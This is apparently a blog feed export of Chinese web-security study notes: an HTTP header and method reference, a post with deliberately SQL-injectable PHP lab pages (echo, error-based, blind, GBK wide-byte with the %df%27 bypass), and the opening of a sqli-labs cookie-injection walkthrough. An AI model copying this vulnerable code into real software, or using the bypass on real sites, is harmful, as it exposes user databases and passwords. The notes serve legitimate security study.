<p><img src="https://i.loli.net/2019/10/02/ao2QAZIYLqRtX61.png" alt=""></p>
<p>对Nginx知之甚少，关于Nginx的请求处理阶段先占个坑，留个比较全面的<a href="https://www.kancloud.cn/kancloud/master-nginx-develop/51835">学习文档</a>占个坑。</p>
<h2 id="0x03-HTTP协议的字段及含义">0x03 HTTP协议的字段及含义</h2>
<h3 id="HTTP请求报文">HTTP请求报文</h3>
<p>请求报文结构：</p>
<p><img src="https://i.loli.net/2019/10/02/VRbOd42c61jHhMp.png" alt=""></p>
<p>其中，值得关注的是HTTP报文头由方法、URI 、HTTP版本、HTTP首部字段等部分构成。<br>
例如，请求<code>hackr.jp</code>网站的请求报文头如下所示：</p>
<p><img src="https://i.loli.net/2019/10/02/w5tUWEacQ6lIFpq.png" alt=""></p>
<h3 id="HTTP响应报文">HTTP响应报文</h3>
<p>响应报文结构：</p>
<p><img src="https://i.loli.net/2019/10/02/eimUWAOTCLDrw8B.png" alt=""></p>
<p>例如，刚刚请求的<code>hackr.jp</code>的响应报文头如下所示：</p>
<p><img src="https://i.loli.net/2019/10/02/q5HAVfkM6Ots7Zg.png" alt=""></p>
<h3 id="HTTP首部字段类型">HTTP首部字段类型</h3>
<ul>
<li>
<p>通用首部字段（General Header Fields）<br>
请求报文和响应报文两方都会使用的首部。</p>
<ul>
<li>
<p>Cache-Control字段</p>
<p>通过指定首部字段 Cache-Control 的指令，就能操作缓存的工作机制。</p>
<p>缓存请求指令一览：</p>
<table>
<thead>
<tr>
<th>指令</th>
<th>Client</th>
<th>Server</th>
</tr>
</thead>
<tbody>
<tr>
<td>no-cache</td>
<td>不接收缓存过的响应</td>
<td>不能对资源进行缓存</td>
</tr>
<tr>
<td>no-store</td>
<td>不缓存请求或响应的任何内容</td>
<td>不缓存请求或响应的任何内容</td>
</tr>
<tr>
<td>max-age = [秒]</td>
<td>接收缓存时间比max-age数值更小的资源</td>
<td>代表资源保存为缓存的最长时间</td>
</tr>
<tr>
<td>max-stale = [秒]</td>
<td>接收已过期的响应</td>
<td></td>
</tr>
<tr>
<td>min-fresh = [秒]</td>
<td>期望在指定时间内的响应仍有效</td>
<td></td>
</tr>
<tr>
<td>no-transform</td>
<td>代理不可更改媒体类型</td>
<td></td>
</tr>
<tr>
<td>only-if-cached</td>
<td>从缓存获取资源</td>
<td></td>
</tr>
<tr>
<td>cache-extension</td>
<td>新指令标记</td>
<td></td>
</tr>
</tbody>
</table>
<p>**注意：**从字面意思上很容易把 no-cache 误解成为不缓存，但事实上 no-cache 代表不缓存过期的资源，缓存会向源服务器进行有效期确认后处理资源，也许称为 do-notserve-from-cache-without-revalidation 更合适，no-store 才是真正地不进行缓存。</p>
</li>
<li>
<p>Connection字段</p>
<p>具备两个作用：</p>
<ul>
<li>
<p>控制不再转发给代理的首部字段</p>
<p><code>conneciton: upgrade</code>表示Upgrade首部字段产生作用的Upgrade对象仅限于客户端和邻接服务器之间。</p>
</li>
<li>
<p>管理持久连接</p>
<p>HTTP/1.1 版本的默认连接都是持久连接。为此，客户端会在持久连接上连续发送请求。当服务器端想明确断开连接时，则指定<br>
Connection 首部字段的值为 Close。</p>
</li>
</ul>
</li>
<li>
<p>Date字段</p>
<p>首部字段 Date 表明创建 HTTP 报文的日期和时间。</p>
</li>
<li>
<p>Transfer-Encoding字段</p>
<p>首部字段 Transfer-Encoding 规定了传输报文主体时采用的编码方式。</p>
</li>
<li>
<p>Upgrade字段</p>
<p>首部字段 Upgrade 用于检测 HTTP 协议及其他协议是否可使用更高的<br>
版本进行通信，其参数值可以用来指定一个完全不同的通信协议。</p>
</li>
<li>
<p>Via字段</p>
<p>使用首部字段 Via 是为了追踪客户端与服务器之间的请求和响应报文的传输路径。</p>
</li>
</ul>
</li>
<li>
<p>请求首部字段（Request Header Fields）<br>
从客户端向服务器端发送请求报文时使用的首部。补充了请求的附加内容、客户端信息、响应内容相关优先级等信息。</p>
<table>
<thead>
<tr>
<th>首部字段名</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>Accept</td>
<td>用户理可处理的媒体类型</td>
</tr>
<tr>
<td>Accept-Charset</td>
<td>优先的字符集</td>
</tr>
<tr>
<td>Accept-Encoding</td>
<td>优先的内容编码</td>
</tr>
<tr>
<td>Accept-Language</td>
<td>优先的语言</td>
</tr>
<tr>
<td>Authorization</td>
<td>Web认证信息</td>
</tr>
<tr>
<td>Expect</td>
<td>期待服务器的特定行为</td>
</tr>
<tr>
<td>From</td>
<td>用户的电子邮箱</td>
</tr>
<tr>
<td>Host</td>
<td>请求资源所在的服务器</td>
</tr>
<tr>
<td>If-Match</td>
<td>比较实体标志（ETag）</td>
</tr>
<tr>
<td>If-None-Match</td>
<td>比较实体标志（ETag）</td>
</tr>
<tr>
<td>If-Modified-Since</td>
<td>比较资源更新时间</td>
</tr>
<tr>
<td>If-Range</td>
<td>资源未更新时发送实体Byte的范围请求</td>
</tr>
<tr>
<td>If-Unmodified-Since</td>
<td>比较资源更新时间（与If-Modified-Since相反）</td>
</tr>
<tr>
<td>Max-Forward</td>
<td>最大传输逐跳数</td>
</tr>
<tr>
<td>Proxy-Authorization</td>
<td>代理服务器要求客⼾端的认证信息</td>
</tr>
<tr>
<td>Referer</td>
<td>对请求中URI的原始获取方</td>
</tr>
<tr>
<td>TE</td>
<td>传输编码的优先级</td>
</tr>
<tr>
<td>User-Agent</td>
<td>HTTP客户端程序信息</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>响应首部字段（Response Header Fields）<br>
从服务器端向客户端返回响应报文时使用的首部。补充了响应的附加内容，也会要求客户端附加额外的内容信息。</p>
<table>
<thead>
<tr>
<th>首部字段</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>Accept-Ranges</td>
<td>是否接受字段范围请求</td>
</tr>
<tr>
<td>Age</td>
<td>推算资源创建经过时间</td>
</tr>
<tr>
<td>ETag</td>
<td>资源匹配信息</td>
</tr>
<tr>
<td>Location</td>
<td>令客户端重定向至指定URI</td>
</tr>
<tr>
<td>Proxy-Authenticate</td>
<td>代理服务器对客户端的认证信息</td>
</tr>
<tr>
<td>Retry-After</td>
<td>对再次发起请求的时机要求</td>
</tr>
<tr>
<td>Server</td>
<td>HTTP服务器的安装信息</td>
</tr>
<tr>
<td>Vary</td>
<td>代理服务器缓存的管理信息</td>
</tr>
<tr>
<td>WWW-Authenticate</td>
<td>服务器对客户端的认证信息</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>实体首部字段（Entity Header Fields）<br>
针对请求报文和响应报文的实体部分使用的首部。补充了资源内容更新时间等与实体有关的信息。</p>
<table>
<thead>
<tr>
<th>首部字段名</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>Allow</td>
<td>可支持的HTTP方法</td>
</tr>
<tr>
<td>Content-Encoding</td>
<td>实体主体适用的编码方式</td>
</tr>
<tr>
<td>Content-Laguage</td>
<td>实体主英文名称体的自然语言</td>
</tr>
<tr>
<td>Content-Length</td>
<td>实体主体的大小</td>
</tr>
<tr>
<td>Content-Location</td>
<td>替代对应资源的URI</td>
</tr>
<tr>
<td>Content-MD5</td>
<td>实体主体的摘要</td>
</tr>
<tr>
<td>Content-Type</td>
<td>实体主体的媒体类型</td>
</tr>
<tr>
<td>Content-Range</td>
<td>实体主体的位置范围</td>
</tr>
<tr>
<td>Expires</td>
<td>实体主体过期的日期时间</td>
</tr>
<tr>
<td>Last-Modied</td>
<td>资源最后修改的日期时间</td>
</tr>
</tbody>
</table>
</li>
</ul>
<h2 id="0x04-HTTP请求方法及返回状态码的类型和含义">0x04 HTTP请求方法及返回状态码的类型和含义</h2>
<h3 id="HTTP请求方法">HTTP请求方法</h3>
<p>HTTP请求方式分为GET 、POST 、PUT 、HEAD 、DELETE 、OPTIONS 、TRACE和CONNECT 八种。</p>
<h4 id="GET：获取资源">GET：获取资源</h4>
<p>GET 方法用来请求访问已被URI 识别的资源。指定的资源经服务器端解析后返回响应内容。也就是说，如果请求的资源是文本，那就保持原样返回；如果是像CGI（Common Gateway Interface，通用网关接口）那样的程序，则返回经过执行后的输出结果。例如：</p>
<p><img src="https://i.loli.net/2019/10/02/tFDO2VuIe3W1i9C.png" alt=""></p>
<h4 id="POST：传输实体主体">POST：传输实体主体</h4>
<p>POST 方法用来传输实体的主体。<br>
虽然用GET 方法也可以传输实体的主体，但⼀般不用GET 方法进行传输，而是用POST 方法。虽说POST 的功能与GET 很相似，但POST 的主要目的并不是获取响应的主体内容。例如：</p>
<p><img src="https://i.loli.net/2019/10/02/yJ7zqt82nVRL3m9.png" alt=""></p>
<h4 id="PUT：传输文件">PUT：传输文件</h4>
<p>PUT 方法用来传输文件。就像FTP协议的文件上传⼀样，要求请求报文的主题中包含文件内容，然后保存到请求URI的位置。但是，鉴于HTTP/1.1的PUT 方法自身不带验证机制，任何⼈都可以上传文件，存在安全性问题，因此⼀般的Web网站不使用该方法。例如：</p>
<p><img src="https://i.loli.net/2019/10/02/JAEWX7DHf9CdVo2.png" alt=""></p>
<h4 id="HEAD：获取报文首部">HEAD：获取报文首部</h4>
<p>HEAD 方法和GET方法⼀样，只是不返回报文主体部分。勇于确认URI 的有效性及资源更新的日期时间等。例如：</p>
<p><img src="https://i.loli.net/2019/10/02/4SNAxOcVTGEm1ud.png" alt=""></p>
<h4 id="DELETE：删除文件">DELETE：删除文件</h4>
<p>DELETE 方法用来删除文件，是与PUT 相反的方法。DELETE方法按请求URI 删除指定的资源。例如：</p>
<p><img src="https://i.loli.net/2019/10/02/2sQ6zCvVKDtNhqB.png" alt=""></p>
<h4 id="OPTIONS：询问支持方法">OPTIONS：询问支持方法</h4>
<p>OPTIONS方法用来查询针对请求URI 指定的资源支持的方法。例如：</p>
<p><img src="https://i.loli.net/2019/10/02/JVylmB8i32jcY1F.png" alt=""></p>
<h4 id="TRACE：追踪路径">TRACE：追踪路径</h4>
<p>TRACE方法是让 Web 服务器端将之前的请求通信环回给客户端的方法。<br>
发送请求时,在 Max-Forwards 首部字段中填入数值,每经过一个服务器端就将该数字减 1 ,当数值刚好减到 0 时,就停止继续传输,最后接收到请求的服务器端则返回状态码 200 OK 的响应。<br>
但是,TRACE 方法本来就不怎么常用,再加上它容易引发XST(Cross-Site Tracing,跨站追踪) 攻击,通常就更不会用到了。</p>
<h4 id="CONNECT：隧道协议连接代理">CONNECT：隧道协议连接代理</h4>
]]></content>
      <categories>
        <category>web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>web安全基础</tag>
        <tag>HTTP协议</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全学习之各种注入类型的环境搭建和代码编写</title>
    <url>/Web_security/basic_learning/7.%E5%90%84%E7%A7%8D%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99/</url>
    <content><![CDATA[<h1 id="Web安全学习之各种注入类型的环境搭建和代码编写">Web安全学习之各种注入类型的环境搭建和代码编写</h1>
<ol>
<li>编写常规回显注入的代码，在之前搭建的环境中测试是否正常；</li>
<li>编写报错注入的代码，并做相应的服务器配置来满足条件，并测试代码是否正常；</li>
<li>编写盲注的代码，在之前的搭建环境中测试是否正常；</li>
<li>编写宽字节注入的代码，并做相应的服务器配置来满足条件，并测试代码是否正常。</li>
</ol>
<h2 id="0x01-回显注入">0x01 回显注入</h2>
<p>回显注入主要的是将查询的内容输出到页面上，这样报错才能回显信息。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Test ErrorBased Injections&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">error_reporting(E_ALL ^ E_DEPRECATED);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Connect database</span></span><br><span class="line">$conn=mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;******&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!conn)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;Failed to connect to MySQL:&#x27;</span>.mysqli_error($conn);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;Success to connect to MySQL&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">mysqli_select_db($conn, <span class="string">&#x27;security&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;Unable to connect to the database: security&quot;</span>);</span><br><span class="line">mysqli_query($conn, <span class="string">&#x27;set names utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// query sql</span></span><br><span class="line"></span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;SQL query:&#x27;</span>.$sql;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">$result=mysqli_query($conn, $sql);</span><br><span class="line">$row=mysqli_fetch_array($result, MYSQLI_BOTH);</span><br><span class="line"><span class="keyword">if</span> ($row)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>.$row[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span>.$row[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191029211759.png" alt=""></p>
<h2 id="0x02-报错注入">0x02 报错注入</h2>
<p>报错注入的原因是<code>mysql_error</code>这个函数导致的，作用是返回上一个mysql操作产生的文本错误信息。<br>
报错注入的前提：页面上没有显示位，但是有sql语句执行错误信息输出。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Test ErrorBased Injections&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/h1&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Connect database</span></span><br><span class="line">$conn=mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;******&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!conn)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;Failed to connect to MySQL:&#x27;</span>.mysqli_error($conn);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;Success to connect to MySQL&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">mysqli_select_db($conn, <span class="string">&#x27;security&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;Unable to connect to the database: security&quot;</span>);</span><br><span class="line">mysqli_query($conn, <span class="string">&#x27;set names utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// query sql</span></span><br><span class="line"></span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;SQL query:&#x27;</span>.$sql;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">$result=mysqli_query($conn, $sql);</span><br><span class="line">$row=mysqli_fetch_array($result, MYSQLI_BOTH);</span><br><span class="line"><span class="keyword">if</span> ($row)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>.$row[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span>.$row[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    print_r(mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191030091300.png" alt=""></p>
<h2 id="0x03-盲注">0x03 盲注</h2>
<p>盲注前提：没有显示位，也没有输出SQL语句执行错误，只显示页面正常和不正常。要有个empty函数来判断是否为空，否则and 1=2也会显示正常页面。</p>
<h3 id="布尔盲注">布尔盲注</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Test Bool-Blind Injections&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/h1&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Connect database</span></span><br><span class="line">$conn=mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;******&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!conn)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;Failed to connect to MySQL:&#x27;</span>.mysqli_error($conn);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;Success to connect to MySQL&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">mysqli_select_db($conn, <span class="string">&#x27;security&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;Unable to connect to the database: security&quot;</span>);</span><br><span class="line">mysqli_query($conn, <span class="string">&#x27;set names utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// query sql</span></span><br><span class="line"></span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;SQL query: &#x27;</span>.$sql;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">$result=mysqli_query($conn, $sql);</span><br><span class="line">$row=mysqli_fetch_array($result, MYSQLI_BOTH);</span><br><span class="line"><span class="keyword">if</span> ($row)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;You are in.........&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191030092410.png" alt=""></p>
<h3 id="时间盲注">时间盲注</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Test Bool-Blind Injections&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/h1&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Connect database</span></span><br><span class="line">$conn=mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;******&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!conn)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;Failed to connect to MySQL:&#x27;</span>.mysqli_error($conn);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;Success to connect to MySQL&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">mysqli_select_db($conn, <span class="string">&#x27;security&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;Unable to connect to the database: security&quot;</span>);</span><br><span class="line">mysqli_query($conn, <span class="string">&#x27;set names utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// query sql</span></span><br><span class="line"></span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;SQL query: &#x27;</span>.$sql;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">$result=mysqli_query($conn, $sql);</span><br><span class="line">$row=mysqli_fetch_array($result, MYSQLI_BOTH);</span><br><span class="line"><span class="keyword">if</span> ($row)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;You are in.........&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;You are in.........&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>和布尔盲注不同的是，不论怎么输入，回显的信息都是相同的。</p>
<h2 id="0x04-宽字节注入">0x04 宽字节注入</h2>
<p>宽字节前提是数据库中采用gbk的编码方式。</p>
<p>如果存在宽字节注入，我们输入%df%27时，经过转译变成了%df%5c%27（%5c是反斜杠\），之后在数据库查询前由于使用了GBK多字节编码，即在汉字编码范围内两个字节会被编码为一个汉字。然后MySQL服务器会对查询语句进行GBK编码即%df%5c转换成了汉字“運”（具体见GBK的汉字编码范围见附录），而单引号逃逸了出来，从而造成了注入漏洞。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Test ErrorBased Injections&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">error_reporting(E_ALL ^ E_DEPRECATED);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Connect database</span></span><br><span class="line">$conn=mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;*****&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!conn)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;Failed to connect to MySQL:&#x27;</span>.mysqli_error($conn);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;Success to connect to MySQL&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">mysqli_select_db($conn, <span class="string">&#x27;security&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;Unable to connect to the database: security&quot;</span>);</span><br><span class="line">mysqli_query($conn, <span class="string">&#x27;set names gbk&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $id = addslashes($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// query sql</span></span><br><span class="line"></span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;SQL query:&#x27;</span>.$sql;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">$result=mysqli_query($conn, $sql);</span><br><span class="line">$row=mysqli_fetch_array($result, MYSQLI_BOTH);</span><br><span class="line"><span class="keyword">if</span> ($row)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>.$row[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span>.$row[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191030100026.png" alt=""></p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>web安全基础</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全学习之Sqli-labs手工注入——Advanced-Injections</title>
    <url>/Web_security/basic_learning/8.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Advanced-Injections/</url>
    <content><![CDATA[<h1 id="Web安全学习之Sqli-labs手工注入——Advanced-Injections">Web安全学习之Sqli-labs手工注入——Advanced-Injections</h1>
<p>Sqli-labs手工注入第二阶段，主要都是一些绕过的技巧（包括WAF）。</p>
<h3 id="Less-21-Cookie-injection-base64-encoded-single-quotes-and-parenthesis">Less-21 Cookie injection-base64 encoded-single quotes and parenthesis</h3>
<p>登录成功后的页面：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191022162419.png" alt=""></p>
<p>很明显<code>cookie</code>字段是被加密处理了（而且后面的<code>=</code>暴露了应该是base64编码方式）。</p>
<blockquote>
<p>插播一个关于讲解base64编码方式的博文，<a href="http://www.ruanyifeng.com/blog/2008/06/base64.html">点击跳转</a>。</p>
</blockquote>
<p>查看php文件确实如此，所以只需要上传paylaod的时候base64加密一下就可以了。</p>
